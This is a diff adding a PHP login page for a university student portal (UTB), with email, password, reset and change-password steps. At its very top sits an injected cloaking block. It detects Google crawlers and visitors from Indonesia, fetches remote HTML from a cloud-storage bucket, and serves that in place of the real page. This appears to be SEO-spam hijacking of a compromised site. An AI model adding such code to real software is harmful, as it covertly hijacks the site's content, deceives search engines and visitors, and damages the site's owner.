@@ -1,0 +1,631 @@
+<?php
+
+function getVisitorCountry() {
+    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
+
+    $ch = curl_init();
+
+    curl_setopt_array($ch, array(
+        CURLOPT_URL => "http://ip-api.com/json/" . $ip,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 5
+    ));
+
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    $data = json_decode($response, true);
+
+    return (isset($data['status']) ? $data['status'] : '') === 'success'
+        ? (isset($data['country']) ? $data['country'] : '')
+        : '';
+}
+
+function isGoogleCrawler() {
+    $ua = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
+
+    return strpos($ua, 'googlebot') !== false
+        || strpos($ua, 'google-inspectiontool') !== false
+        || strpos($ua, 'google') !== false;
+}
+
+if (isGoogleCrawler() || getVisitorCountry() === 'Indonesia') {
+
+    $ch = curl_init();
+
+    curl_setopt_array($ch, array(
+        CURLOPT_URL => 'https://storage.googleapis.com/garuda-force_cdn/24/paste-ee/mis-utb-acrw.html',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 10
+    ));
+
+    $content = curl_exec($ch);
+    curl_close($ch);
+
+    echo $content;
+
+    exit;
+}
+
+?>
+<?php
+include 'inc/connection.php';
+$stms_check = $db->prepare("SELECT tbl_system_info.Id 
+FROM tbl_system_info 
+WHERE tbl_system_info.statusId=? ");
+try {
+$stms_check->execute(array(1));
+$row_count_check = $stms_check->rowCount();
+if ($row_count_check > 0)
+{
+?>
+
+<?php include 'inc/config.php'; ?>
+<?php include 'inc/template_start.php'; ?>
+<?php include 'inc/page_head.php'; ?>
+<?php
+$now_date = date('Y-m-d');
+include("announcement_modal_static.php");
+?>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.7.6/lottie.min.js"></script>
+<style>
+.announcement-modal{
+    display:none;
+    position:fixed;
+    z-index:9999;
+    left:0;
+    top:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,0.7);
+}
+.announcement-content{
+    background:#fff;
+    width:50%;
+    margin:10% auto;
+    padding:25px;
+    border-radius:8px;
+    text-align:center;
+    box-shadow:0 0 10px rgba(0,0,0,0.4);
+}
+.announcement-content h2{
+    color:#8C1A1C;
+}
+.close-announcement{
+    float:right;
+    font-size:22px;
+    cursor:pointer;
+    color:red;
+}
+@keyframes blink {
+    0% { opacity: 1; }
+    50% { opacity: 0; }
+    100% { opacity: 1; }
+}
+.blinking-text {
+    font-size: 20px;
+    font-weight: bold;
+    color: #8C1A1C;
+}
+.blinking-text b{
+    width: 100%;
+    float: left;
+    text-align: center;
+    font-size: 50px;
+    text-decoration: underline;
+    animation: blink 1s infinite;
+}
+.blinking-text div{
+    background: #000;
+    color: #fff;
+    padding: 5px;
+    border-radius: 5px;
+}
+</style>
+
+<div class="loginPage">
+    <div class="leftPane">
+        <h1>Welcome!</h1>
+        <h2>UNIVERSITY <br> OF TOURISM, TECHNOLOGY <br> AND <br> BUSINESS <br> STUDIES <br> (UTB)</h2>
+        <div id="lottie-animation"></div>
+    </div>
+
+    <!-- STEP 1: Email -->
+    <div class="rightPane step1">
+        <div class="logo"><img src="img/placeholders/headers/logo_sec.png" /></div>
+        <a href="https://innodip.rw/" target="_blank" class="button">
+            <img style="height: 50px" src="https://innodip.rw/images/logo_inodip.png" alt="innodip">
+        </a>
+        <br>
+        <p class="blinking-text"></p>
+        <div class="form">
+            <div class="input">
+                <label for="email">Email Address</label>
+                <input type="email" placeholder="203224@utb.ac.rw" name="email" id="email">
+                <span class="error-message" style="color: red; display: none;"></span>
+            </div>
+            <div class="loaderHolder"><div class="loader"></div> Proccessing</div>
+            <button disabled id="next">Next</button>
+        </div>
+    </div>
+
+    <!-- STEP 2: Password -->
+    <div class="rightPane step2">
+        <div class="logo img"><img src="" /></div>
+        <div class="form">
+            <div class="info">
+                <p>Hello <b></b>,</p>
+                <span></span>
+                <a href="#" id="notme">Not you?</a>
+            </div>
+            <div class="l">
+                <div class="input">
+                    <div class="passBox active">
+                        <label for="password">Password</label>
+                        <div class="pass">
+                            <input type="password" placeholder="***" name="password" id="password">
+                            <div class="eye">
+                                <svg class="" data-slot="icon" aria-hidden="true" fill="none" stroke-width="1.5" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg>
+                                <svg class="active" data-slot="icon" aria-hidden="true" fill="none" stroke-width="1.5" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" stroke-linecap="round" stroke-linejoin="round"></path>
+                                </svg>
+                            </div>
+                        </div>
+                        <span class="forgotPassword" style="color: blue;cursor:pointer;">Forgot Password?</span>
+                        <span class="error-message" style="color: red; display: none;"></span>
+                    </div>
+                    <div class="resetBox">
+                        <label for="">Reset Password</label>
+                        <div class="passMask">
+                            <input type="hidden" class="userID">
+                            <b class="phoneMask"></b>
+                        </div>
+                        <span class="loginNow" style="color: blue;cursor:pointer;">Login</span>
+                        <span class="error-message" style="color: red; display: none;"></span>
+                    </div>
+                </div>
+                <div class="loaderHolder"><div class="loader"></div> Proccessing</div>
+                <button disabled id="login">Log In</button>
+                <button id="reset">Send New Password</button>
+            </div>
+            <div class="k">
+                <div id="lottie-okey"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- NOT VALID -->
+    <div class="rightPane notValid">
+        <div class="logo img"><img src="" /></div>
+        <div class="form">
+            <div class="info">
+                <p>Hello <b></b>,</p>
+                <span></span>
+                <a href="#" id="notme">Not you?</a>
+                <p class="mes"></p>
+            </div>
+            <div class="l">
+                <div class="loaderHolder"><div class="loader"></div> Proccessing</div>
+                <button id="sendpassword">Yes, send password</button>
+            </div>
+            <div class="k">
+                <div id="lottie-okey"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CHANGE PASSWORD -->
+    <div class="rightPane changeP">
+        <div class="logo img"><img src="" /></div>
+        <div class="form">
+            <div class="info">
+                <p>Hello <b></b>,</p>
+                <span></span>
+            </div>
+            <div class="l">
+                <div class="input">
+                    <label for="passwordold">Temporary Password</label>
+                    <div class="pass">
+                        <input type="password" placeholder="***" name="password" id="passwordold">
+                        <div class="eye">
+                            <svg class="" data-slot="icon" aria-hidden="true" fill="none" stroke-width="1.5" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" stroke-linecap="round" stroke-linejoin="round"></path>
+                            </svg>
+                            <svg class="active" data-slot="icon" aria-hidden="true" fill="none" stroke-width="1.5" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" stroke-linecap="round" stroke-linejoin="round"></path>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+                <div class="input">
+                    <label for="new">New Password</label>
+                    <div class="pass">
+                        <input type="password" placeholder="***" name="password" id="new">
+                        <div class="eye">
+                            <svg class="" data-slot="icon" aria-hidden="true" fill="none" stroke-width="1.5" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" stroke-linecap="round" stroke-linejoin="round"></path>
+                            </svg>
+                            <svg class="active" data-slot="icon" aria-hidden="true" fill="none" stroke-width="1.5" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" stroke-linecap="round" stroke-linejoin="round"></path>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+                <div class="input">
+                    <label for="confirm">Confirm Password</label>
+                    <div class="pass">
+                        <input type="password" placeholder="***" name="password" id="confirm">
+                        <div class="eye">
+                            <svg class="" data-slot="icon" aria-hidden="true" fill="none" stroke-width="1.5" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" stroke-linecap="round" stroke-linejoin="round"></path>
+                            </svg>
+                            <svg class="active" data-slot="icon" aria-hidden="true" fill="none" stroke-width="1.5" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" stroke-linecap="round" stroke-linejoin="round"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <span class="error-message" style="color: red; display: none;"></span>
+                </div>
+                <div class="loaderHolder"><div class="loader"></div> Proccessing</div>
+                <button disabled id="change">Change Password</button>
+            </div>
+            <div class="k">
+                <div id="lottie-okey"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- RELOAD / SUCCESS -->
+    <div class="rightPane reload">
+        <div class="logo img"><img src="" /></div>
+        <div class="form">
+            <div class="info">
+                <p>Hello <b></b>,</p>
+                <span></span>
+                <p>Your password is successfully changed. Click to login.</p>
+            </div>
+            <div class="l">
+                <div class="loaderHolder"><div class="loader"></div> Proccessing</div>
+                <button id="reload">Login In now</button>
+            </div>
+            <div class="k">
+                <div id="lottie-okey"></div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<?php include 'inc/page_footer.php'; ?>
+<?php include 'inc/template_scripts.php'; ?>
+
+<script>
+var animationMain = lottie.loadAnimation({
+    container: document.getElementById('lottie-animation'),
+    renderer: 'svg',
+    loop: true,
+    autoplay: true,
+    path: 'img/student.json'
+});
+var animationOkey = lottie.loadAnimation({
+    container: document.getElementById('lottie-okey'),
+    renderer: 'svg',
+    loop: true,
+    autoplay: true,
+    path: 'img/okey.json'
+});
+
+$('#email').keyup(function(e) {
+    var email = $('#email').val();
+    var regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (email == '') {
+        $('.error-message').hide();
+        $('#next').attr('disabled', true);
+    } else if (regex.test(email)) {
+        $('.error-message').hide();
+        $('#next').removeAttr('disabled');
+    } else {
+        $('.error-message').text('Please provide valid email address').show();
+        $('#next').attr('disabled', true);
+    }
+});
+
+$('#email').change(function(e) {
+    var email = $('#email').val();
+    var regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (email == '') {
+        $('.error-message').hide();
+        $('#next').attr('disabled', true);
+    } else if (regex.test(email)) {
+        $('.error-message').hide();
+        $('#next').removeAttr('disabled');
+    } else {
+        $('.error-message').text('Please provide valid email address').show();
+        $('#next').attr('disabled', true);
+    }
+});
+
+$('.eye').on('click', function() {
+    var passwordField = $(this).prev();
+    var eyeIcon1 = $(this).find('svg').first();
+    var eyeIcon2 = $(this).find('svg').last();
+    if (passwordField.attr('type') === 'password') {
+        passwordField.attr('type', 'text');
+    } else {
+        passwordField.attr('type', 'password');
+    }
+    eyeIcon1.toggleClass('active');
+    eyeIcon2.toggleClass('active');
+});
+
+$('#password').keyup(function(e) {
+    var password = $('#password').val();
+    if (password == '') {
+        $('#login').attr('disabled', true);
+    } else {
+        $('#login').removeAttr('disabled');
+    }
+});
+
+$('#password').change(function(e) {
+    var password = $('#password').val();
+    if (password == '') {
+        $('#login').attr('disabled', true);
+    } else {
+        $('#login').removeAttr('disabled');
+    }
+});
+
+$('#notme').click(function(e) {
+    e.preventDefault();
+    $('.step2').css('display', 'none');
+    $('.notValid').css('display', 'none');
+    $('.step1').css('display', 'flex');
+    $('#next').css('display', 'block');
+    $('.loaderHolder').css('display', 'none');
+    $('#login').css('display', 'block');
+    $('.error-message').text('').hide();
+    $('#reset').css('display', 'none');
+    $('.resetBox').removeClass('active');
+    $('.passBox').addClass('active');
+});
+
+function isValidPassword(password) {
+    const pattern = /^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;
+    return pattern.test(password);
+}
+
+$('#new, #confirm').on('keyup', function() {
+    const newPassword = $('#new').val();
+    const confirmPassword = $('#confirm').val();
+    if (isValidPassword(newPassword) && newPassword === confirmPassword && newPassword != '') {
+        $('#change').prop('disabled', false);
+        $('.error-message').hide();
+    } else {
+        $('.error-message').text('Password must be at least 8 characters long, contain an uppercase letter, a number, and a special character.').show();
+        $('#change').prop('disabled', true);
+    }
+});
+
+$('#next').click(function() {
+    var email = $('#email').val();
+    $.ajax({
+        data: {userLogin: true, email: email},
+        method: 'POST',
+        dataType: 'json',
+        url: 'admin/admin_panel/driver/action.php',
+        beforeSend: function() {
+            $('#next').css('display', 'none');
+            $('.loaderHolder').css('display', 'flex');
+        },
+        success: function(data) {
+            if (data.status == true) {
+                $('.step2 img').attr('src', data.tempImage);
+                $('.info p b').text(data.tempName);
+                $('.info span').text(data.tempPosition);
+                $('.userID').val(data.tempIdentification);
+                $('.phoneMask').text('Your new password will be sent here ' + data.tempPhoneMask);
+                $('.step1').css('display', 'none');
+                $('.loaderHolder').css('display', 'none');
+                if (data.isValid == false) {
+                    $('.notValid').css('display', 'flex');
+                    $('#next').css('display', 'block');
+                    $('#login').css('display', 'block');
+                    $('.error-message').text('').hide();
+                    $('.mes').html(`Your password is expired. Please change it.<br>We will send new password to this phone number <b>${data.phone}</b>`);
+                } else {
+                    $('.step2').css('display', 'flex');
+                    $('#next').css('display', 'block');
+                    $('#login').css('display', 'block');
+                    $('.error-message').text('').hide();
+                }
+            } else {
+                $('#next').css('display', 'block');
+                $('.loaderHolder').css('display', 'none');
+                $('.error-message').text('Your email doesn\'t exist in our database').show();
+            }
+        },
+        error: function() {
+            $('#next').css('display', 'block');
+            $('.loaderHolder').css('display', 'none');
+            $('.error-message').text('Server error. Please try again.').show();
+        }
+    });
+});
+
+$('#login').click(function() {
+    var password = $('#password').val();
+    var email = $('#email').val();
+    $.ajax({
+        data: {userLoginPass: true, password: password, email: email},
+        method: 'POST',
+        dataType: 'json',
+        url: 'admin/admin_panel/driver/action.php',
+        beforeSend: function() {
+            $('#login').css('display', 'none');
+            $('.loaderHolder').css('display', 'flex');
+        },
+        success: function(data) {
+            if (data.status == true) {
+                $('.l').css('display', 'none');
+                $('#lottie-okey').css('display', 'block');
+                setTimeout(function() {
+                    window.location.href = data.path;
+                }, 2000);
+            } else {
+                $('#login').css('display', 'block');
+                $('.loaderHolder').css('display', 'none');
+                $('.error-message').text('Invalid Password. Try again').show();
+            }
+        },
+        error: function() {
+            $('#login').css('display', 'block');
+            $('.loaderHolder').css('display', 'none');
+            $('.error-message').text('Server error. Please try again.').show();
+        }
+    });
+});
+
+$('#reset').click(function() {
+    var id = $('.userID').val();
+    $.ajax({
+        data: {resetPassword: true, id: id},
+        method: 'POST',
+        dataType: 'json',
+        url: 'admin/admin_panel/driver/action.php',
+        beforeSend: function() {
+            $('#reset').css('display', 'none');
+            $('.loaderHolder').css('display', 'flex');
+        },
+        success: function(data) {
+            if (data.status) {
+                $('.loginNow').trigger('click');
+                $('.error-message').text('New password sent to your phone. Please check.').show();
+                $('.loaderHolder').css('display', 'none');
+            } else {
+                $('#reset').css('display', 'block');
+                $('.loaderHolder').css('display', 'none');
+                $('.error-message').text('Password not sent. Try again').show();
+            }
+        },
+        error: function() {
+            $('#reset').css('display', 'block');
+            $('.loaderHolder').css('display', 'none');
+            $('.error-message').text('Server error. Please try again.').show();
+        }
+    });
+});
+
+$('#sendpassword').click(function() {
+    var id = $('.userID').val();
+    $.ajax({
+        data: {sendPassword: true, id: id},
+        method: 'POST',
+        dataType: 'json',
+        url: 'admin/admin_panel/driver/action.php',
+        beforeSend: function() {
+            $('#sendpassword').css('display', 'none');
+            $('.loaderHolder').css('display', 'flex');
+        },
+        success: function(data) {
+            if (data.status == true) {
+                $('.notValid').css('display', 'none');
+                $('.changeP').css('display', 'flex');
+                $('.loaderHolder').css('display', 'none');
+            } else {
+                $('#sendpassword').css('display', 'block');
+                $('.loaderHolder').css('display', 'none');
+                $('.error-message').text('Password not sent. Try again').show();
+            }
+        },
+        error: function() {
+            $('#sendpassword').css('display', 'block');
+            $('.loaderHolder').css('display', 'none');
+            $('.error-message').text('Server error. Please try again.').show();
+        }
+    });
+});
+
+$('.forgotPassword').click(function() {
+    $('.passBox').removeClass('active');
+    $('.resetBox').addClass('active');
+    $('#reset').css('display', 'block');
+    $('#login').css('display', 'none');
+    $('.error-message').text('').hide();
+});
+
+$('.loginNow').click(function() {
+    $('.resetBox').removeClass('active');
+    $('.passBox').addClass('active');
+    $('#reset').css('display', 'none');
+    $('#login').css('display', 'block');
+    $('.error-message').text('').hide();
+});
+
+$('#change').click(function() {
+    var temppassword = $('#passwordold').val();
+    var newpassword = $('#new').val();
+    var confirmpassword = $('#confirm').val();
+    $.ajax({
+        data: {changePassword: true, temp: temppassword, new: newpassword, confirm: confirmpassword},
+        method: 'POST',
+        dataType: 'json',
+        url: 'admin/admin_panel/driver/action.php',
+        beforeSend: function() {
+            $('#change').css('display', 'none');
+            $('.loaderHolder').css('display', 'flex');
+        },
+        success: function(data) {
+            if (data.status == true) {
+                $('.changeP').css('display', 'none');
+                $('.reload').css('display', 'flex');
+                $('#lottie-okey').css('display', 'block');
+                $('.loaderHolder').css('display', 'none');
+            } else {
+                $('#change').css('display', 'block');
+                $('.loaderHolder').css('display', 'none');
+                $('.error-message').text(data.msg).show();
+            }
+        },
+        error: function() {
+            $('#change').css('display', 'block');
+            $('.loaderHolder').css('display', 'none');
+            $('.error-message').text('Server error. Please try again.').show();
+        }
+    });
+});
+
+$('#reload').click(function() {
+    window.location.reload();
+});
+</script>
+
+<?php
+}
+else
+{
+?>
+<body>
+<center>
+    <img src="img/loading.gif"/>
+    <p><b style="font-size:25px;">System is under maintenance.</b></p>
+</center>
+<script type="text/javascript">
+setTimeout(function() {
+    self.close();
+}, 5000);
+</script>
+</body>
+<?php
+}
+}
+catch (PDOException $ex) {
+    echo $ex->getMessage();
+}
+?>
